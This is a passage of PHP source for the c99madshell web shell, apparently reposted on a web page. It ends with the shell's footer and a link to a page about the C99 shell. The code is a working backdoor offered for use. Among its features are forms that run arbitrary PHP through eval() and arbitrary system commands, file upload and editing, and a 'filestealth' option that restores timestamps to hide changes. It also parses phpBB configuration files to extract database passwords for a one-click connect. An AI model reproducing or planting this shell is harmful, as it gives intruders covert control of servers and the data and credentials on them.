   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("                ",$ret)) {$ret = str_replace("                ","        ",$ret);}
   while (ereg("         ",$ret)) {$ret = str_replace("         ","        ",$ret);}
   $ret = convert_cyr_string($ret,"d","w");
   $stack = explode("
",$ret);
   unset($stack[0],$stack[2]);
   $stack = array_values($stack);
   $head = explode("        ",$stack[0]);
   $head[1] = explode(" ",$head[1]);
   $head[1] = $head[1][0];
   $stack = array_slice($stack,1);
   unset($head[2]);
   $head = array_values($head);

   if ($parsesort[1] != "a") {$y = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."a\"';document.todo.submit();\"&gt;!&lt;/a&gt;";}
   else {$y = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$k."d\"';document.todo.submit();\"&gt;!&lt;/a&gt;";}
   if ($k &gt; count($head)) {$k = count($head)-1;}
   for($i=0;$i&lt;count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "&lt;a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.processes_sort.value='".$i.$parsesort[1]."a\"';document.todo.submit();\"&gt;&lt;b&gt;".trim($head[$i])."&lt;/b&gt;&lt;/a&gt;";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
    {
     echo "&lt;tr&gt;";
     $line = explode("        ",$line);
     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
     $line[2] = intval(str_replace(" ","",$line[2]))*1024;
     $prcs[] = $line;
     echo "&lt;/tr&gt;";
    }
   }
  }
  $head[$k] = "&lt;b&gt;".$head[$k]."&lt;/b&gt;".$y;
  $v = $processes_sort[0];
  usort($prcs,"tabsort");
  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}
  $tab = array();
  $tab[] = $head;
  $tab = array_merge($tab,$prcs);
  echo "&lt;TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"&gt;";
  foreach($tab as $i=&gt;$k)
  {
   echo "&lt;tr&gt;";
   foreach($k as $j=&gt;$v) {if ($win and $i &gt; 0 and $j == 2) {$v = view_size($v);} echo "&lt;td&gt;".$v."&lt;/td&gt;";}
   echo "&lt;/tr&gt;";
  }
  echo "&lt;/table&gt;";
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "&lt;b&gt;Result of execution this PHP-code&lt;/b&gt;:&lt;br&gt;";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("
",$ret))+1;
    if ($rows &lt; 10) {$rows = 10;}
    echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"".$rows."\" readonly&gt;".htmlspecialchars($ret)."&lt;/textarea&gt;";
   }
   else {echo $ret."&lt;br&gt;";}
  }
  else
  {
   if ($eval_txt)
   {
    echo "&lt;br&gt;&lt;textarea cols=\"122\" rows=\"15\" readonly&gt;";
    eval($eval);
    echo "&lt;/textarea&gt;";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "&lt;b&gt;Execution PHP-code&lt;/b&gt;"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
 echo "&lt;form method=POST&gt;&lt;input type=hidden name=act value=eval&gt;&lt;textarea name=\"eval\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($eval)."&lt;/textarea&gt;&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=\"Execute\"&gt;&nbsp;Display in text-area&nbsp;&lt;input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "&gt;&lt;/form&gt;";
}
if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "&lt;center&gt;&lt;b&gt;Permision denied (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;/center&gt;";}
  else {echo "&lt;center&gt;&lt;b&gt;File does not exists (".htmlspecialchars($d.$f).")!&lt;/b&gt;&lt;br&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='edit';document.todo.c.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;&lt;u&gt;Create&lt;/u&gt;&lt;/a&gt;&lt;/center&gt;";}
 }
 else
 {
  $r = @file_get_contents($d.$f);
  $ext = explode(".",$f);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $rft = "";
  foreach($ftypes as $k=&gt;$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
  if (empty($ft)) {$ft = $rft;}
  $arr = array(
   array("DIZ","info"),
   array("HTML","html"),
   array("TXT","txt"),
   array("Code","code"),
   array("Session","phpsess"),
   array("EXE","exe"),
   array("SDB","sdb"),
   array("INI","ini"),
   array("DOWNLOAD","download"),
   array("RTF","notepad"),
   array("EDIT","edit")
  );
  echo "&lt;b&gt;Viewing file:&nbsp;&nbsp;&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."&lt;/b&gt;&lt;br&gt;Select action/file-type:&lt;br&gt;";
  foreach($arr as $t)
  {
   if ($t[1] == $rft) {echo " &lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;&lt;font color=green&gt;".$t[0]."&lt;/font&gt;&lt;/a&gt;";}
   elseif ($t[1] == $ft) {echo " &lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;&lt;b&gt;&lt;u&gt;".$t[0]."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;";}
   else {echo " &lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='".$t[1]."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;&lt;b&gt;".$t[0]."&lt;/b&gt;&lt;/a&gt;";}
   echo " |";
  }
  echo "&lt;hr size=\"1\" noshade&gt;";
  if ($ft == "info")
  {
   echo "&lt;b&gt;Information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Path&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".$d.$f."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".view_size(filesize($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MD5&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".md5_file($d.$f)."&lt;/td&gt;&lt;/tr&gt;";
   if (!$win)
   {
    echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";
    $ow = posix_getpwuid(fileowner($d.$f));
    $gr = posix_getgrgid(filegroup($d.$f));
    echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
   }
   echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.f.value='".urlencode($f)."';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;".view_perms_color($d.$f)."&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d.$f))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
   $fi = fopen($d.$f,"rb");
   if ($fi)
   {
    if ($fullhexdump) {echo "&lt;b&gt;FULL HEXDUMP&lt;/b&gt;"; $str = fread($fi,filesize($d.$f));}
    else {echo "&lt;b&gt;HEXDUMP PREVIEW&lt;/b&gt;"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
    $n = 0;
    $a0 = "00000000&lt;br&gt;";
    $a1 = "";
    $a2 = "";
    for ($i=0; $i&lt;strlen($str); $i++)
    {
     $a1 .= sprintf("%02X",ord($str[$i]))." ";
     switch (ord($str[$i]))
     {
      case 0:  $a2 .= "&lt;font&gt;0&lt;/font&gt;"; break;
      case 32:
      case 10:
      case 13: $a2 .= "&nbsp;"; break;
      default: $a2 .= htmlspecialchars($str[$i]);
     }
     $n++;
     if ($n == $hexdump_rows)
     {
      $n = 0;
      if ($i+1 &lt; strlen($str)) {$a0 .= sprintf("%08X",$i+1)."&lt;br&gt;";}
      $a1 .= "&lt;br&gt;";
      $a2 .= "&lt;br&gt;";
     }
    }
    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."&lt;br&gt;";}
    echo "&lt;table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4&gt;&lt;tr&gt;&lt;td bgcolor=#666666&gt;".$a0."&lt;/td&gt;&lt;td bgcolor=000000&gt;".$a1."&lt;/td&gt;&lt;td bgcolor=000000&gt;".$a2."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
   }
   $encoded = "";
   if ($base64 == 1)
   {
    echo "&lt;b&gt;Base64 Encode&lt;/b&gt;&lt;br&gt;";
    $encoded = base64_encode(file_get_contents($d.$f));
   }
   elseif($base64 == 2)
   {
    echo "&lt;b&gt;Base64 Encode + Chunk&lt;/b&gt;&lt;br&gt;";
    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
   }
   elseif($base64 == 3)
   {
    echo "&lt;b&gt;Base64 Encode + Chunk + Quotes&lt;/b&gt;&lt;br&gt;";
    $encoded = base64_encode(file_get_contents($d.$f));
    $encoded = substr(preg_replace("!.{1,76}!","''.
",$encoded),0,-2);
   }
   elseif($base64 == 4)
   {
    $text = file_get_contents($d.$f);
    $encoded = base64_decode($text);
    echo "&lt;b&gt;Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "&lt;/b&gt;&lt;br&gt;";
   }
   if (!empty($encoded))
   {
    echo "&lt;textarea cols=80 rows=10&gt;".htmlspecialchars($encoded)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;";
   }
   echo "&lt;b&gt;HEXDUMP:&lt;/b&gt;&lt;nobr&gt; [&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.fullhexdump.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;Full&lt;/a&gt;] [&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;Preview&lt;/a&gt;]&lt;br&gt;&lt;b&gt;Base64: &lt;/b&gt;
&lt;nobr&gt;[&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='1';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;Encode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;nobr&gt;[&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='2';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;+chunk&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;nobr&gt;[&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='3';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;+chunk+quotes&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;nobr&gt;[&lt;a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='".urlencode($f)."';document.todo.ft.value='info';document.todo.base64.value='4';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"&gt;Decode&lt;/a&gt;]&nbsp;&lt;/nobr&gt;
&lt;P&gt;";
  }
  elseif ($ft == "html")
  {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {c99shexit();}
  }
  elseif ($ft == "txt") {echo "&lt;pre&gt;".htmlspecialchars($r)."&lt;/pre&gt;";}
  elseif ($ft == "ini") {echo "&lt;pre&gt;"; var_dump(parse_ini_file($d.$f,TRUE)); echo "&lt;/pre&gt;";}
  elseif ($ft == "phpsess")
  {
   echo "&lt;pre&gt;";
   $v = explode("|",$r);
   echo $v[0]."&lt;br&gt;";
   var_dump(unserialize($v[1]));
   echo "&lt;/pre&gt;";
  }
  elseif ($ft == "exe")
  {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=&gt;$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "&lt;b&gt;Execute file:&lt;/b&gt;&lt;form method=POST&gt;&lt;input type=hidden name=act value=cmd&gt;&lt;input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"&gt;&lt;br&gt;Display in text-area&lt;input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked&gt;&lt;input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Execute\"&gt;&lt;/form&gt;";
  }
  elseif ($ft == "sdb") {echo "&lt;pre&gt;"; var_dump(unserialize(base64_decode($r))); echo "&lt;/pre&gt;";}
  elseif ($ft == "code")
  {
   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
   {
    $arr = explode("
",$r);
    if (count($arr == 18))
    {
     include($d.$f);
     echo "&lt;b&gt;phpBB configuration is detected in this file!&lt;br&gt;";
     if ($dbms == "mysql4") {$dbms = "mysql";}
     if ($dbms == "mysql") {echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($dbuser)."';document.sql.sql_passwd.value='".htmlspecialchars($dbpasswd)."';document.sql.sql_server.value='".htmlspecialchars($dbhost)."';document.sql.sql_port.value='3306';document.sql.sql_db.value='".htmlspecialchars($dbname)."';document.sql.submit();\"&gt;&lt;b&gt;&lt;u&gt;Connect to DB&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;";}
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99madshell. Please, report us for fix.";}
     echo "Parameters for manual connect:&lt;br&gt;";
     $cfgvars = array("dbms"=&gt;$dbms,"dbhost"=&gt;$dbhost,"dbname"=&gt;$dbname,"dbuser"=&gt;$dbuser,"dbpasswd"=&gt;$dbpasswd);
     foreach ($cfgvars as $k=&gt;$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'&lt;br&gt;";}
     echo "&lt;/b&gt;&lt;hr size=\"1\" noshade&gt;";
    }
   }
   echo "&lt;div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\"&gt;";
   if (!empty($white)) {@ob_clean();}
   highlight_file($d.$f);
   if (!empty($white)) {c99shexit();}
   echo "&lt;/div&gt;";
  }
  elseif ($ft == "download")
  {
   @ob_clean();
   header("Content-type: application/octet-stream");
   header("Content-length: ".filesize($d.$f));
   header("Content-disposition: attachment; filename=\"".$f."\";");
   echo $r;
   exit;
  }
  elseif ($ft == "notepad")
  {
   @ob_clean();
   header("Content-type: text/plain");
   header("Content-disposition: attachment; filename=\"".$f.".txt\";");
   echo($r);
   exit;
  }
  elseif ($ft == "edit")
  {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "&lt;b&gt;Can't write to file!&lt;/b&gt;";}
    else
    {
     echo "&lt;b&gt;Saved!&lt;/b&gt;";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("
",$r));
   if ($rows &lt; 10) {$rows = 10;}
   if ($rows &gt; 30) {$rows = 30;}
   echo "&lt;form method=\"POST\"&gt;&lt;input name='act' type='hidden' value='f'&gt;&lt;input name='f' type='hidden' value='".urlencode($f)."'&gt;&lt;input name='ft' type='hidden' value='edit'&gt;&lt;input name='d' type='hidden' value='".urlencode($d)."'&gt;&lt;input type=submit name=submit value=\"Save\"&gt;&nbsp;&lt;input type=\"reset\" value=\"Reset\"&gt;&nbsp;&lt;input type=\"button\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".addslashes(substr($d,0,-1))."';document.todo.submit();\" value=\"Back\"&gt;&lt;br&gt;&lt;textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\"&gt;".htmlspecialchars($r)."&lt;/textarea&gt;&lt;/form&gt;";
  }
  elseif (!empty($ft)) {echo "&lt;center&gt;&lt;b&gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.&lt;/b&gt;&lt;/center&gt;";}
  else {echo "&lt;center&gt;&lt;b&gt;Unknown extension (".$ext."), please, select type manually.&lt;/b&gt;&lt;/center&gt;";}
 }
}
if ($act == "about") {echo "&lt;center&gt;&lt;b&gt;Webbased shell for administration your resources&lt;br&gt;Credits:&lt;br&gt;Start coding by CCTeaM.&lt;br&gt;&lt;font color=green&gt;Edited and Finished by &lt;b&gt;MADNET&lt;/b&gt;&lt;br&gt;ICQ 751777 &lt;a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=751777\"&gt;&lt;img src=\"http://wwp.icq.com/scripts/online.dll?icq=751777&img=5\" border=0 align=absmiddle&gt;&lt;/font&gt;&lt;/a&gt;.&lt;/b&gt;";}
?>
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;a bookmark="minipanel"&gt;&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
&lt;tr&gt;&lt;td width="100%" height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="#" onclick="document.todo.act.value='cmd';document.todo.d.value='<?php echo urlencode($d); ?>';document.todo.submit();"&gt;&lt;b&gt;Command execute&lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="cmd"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;select name="cmd"&gt;<?php foreach ($cmdaliases as $als) {echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";} ?>&lt;/select&gt;&lt;input type=hidden name="cmd_txt" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt;
&lt;br&gt;
&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
&lt;tr&gt;
 &lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: &lt;a href="#" onclick="document.todo.act.value='search';document.todo.submit();"&gt;&lt;b&gt;Search&lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="search_name" size="29" value="(.*)"&gt;&nbsp;&lt;input type="checkbox" name="search_name_regexp" value="1"  checked&gt; - regexp&nbsp;&lt;input type=submit name=submit value="Search"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;
 &lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: &lt;a href="#" onclick="document.todo.act.value='upload';document.todo.submit();"&gt;&lt;b&gt;Upload&lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;form method="POST" ENCTYPE="multipart/form-data"&gt;&lt;input type=hidden name=act value="upload"&gt;&lt;input type="file" name="uploadfile"&gt;&lt;input type=hidden name="miniform" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Upload"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Make Dir ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkdir"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Make File ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"&gt;&lt;input type=hidden name="ft" value="edit"&gt;&nbsp;&lt;input type=submit value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Go Dir ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="ls"&gt;&lt;input type="text" name="d" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Go File ::&lt;/b&gt;&lt;form method="POST""&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="f" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type=submit value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;p align="center"&gt;&lt;b&gt;--[ c99madshell v. <?php echo $shver; ?>&lt;a href="#" OnClick="document.todo.act.value='about';document.todo.submit();"&gt;&lt;u&gt; EDITED BY &lt;/b&gt;&lt;b&gt;MADNET&lt;/u&gt;&lt;/b&gt; &lt;/a&gt;| &lt;a href="http://securityprobe.net"&gt;&lt;font color="#FF0000"&gt;http://securityprobe.net&lt;/font&gt;&lt;/a&gt;&lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;<?php chdir($lastdir); c99shexit(); ?>
{% endhighlight %}

 [1]: http://hackingscripts.com/c99-shell/ "C99 shell"